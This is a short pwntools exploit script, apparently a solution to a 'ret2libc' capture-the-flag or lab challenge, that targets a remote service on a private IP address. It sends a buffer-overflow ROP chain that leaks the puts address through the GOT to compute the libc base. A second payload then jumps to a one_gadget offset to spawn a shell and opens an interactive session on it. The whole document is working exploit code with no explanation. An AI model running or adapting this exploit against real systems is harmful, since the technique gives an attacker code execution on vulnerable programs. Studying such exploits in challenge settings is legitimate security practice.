from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("./ret2libc")
s=remote("192.168.3.253",51005)
elf=ELF("../dist/ret2libc")
libc=ELF("../dist/libc.so.6")
s.recvuntil(b"input:\n")
rdi=0x0000000000401333
p=flat([
    b"\x00"*0x20,
    0x404000,
    rdi,elf.got.puts,
    elf.plt.puts,
    elf.sym.main,
])
s.sendline(p)
s.recvline()
libc.address=u64(s.recvline()[:-1].ljust(8,b"\x00"))-libc.sym.puts
success(hex(libc.address))

r12__r15=0x000000000040132c
p=flat([
    b"\x00"*0x20,
    0x404000,
    r12__r15,0,0,0,0,
    libc.address+0xe3afe,
])
s.sendline(p)

s.interactive()
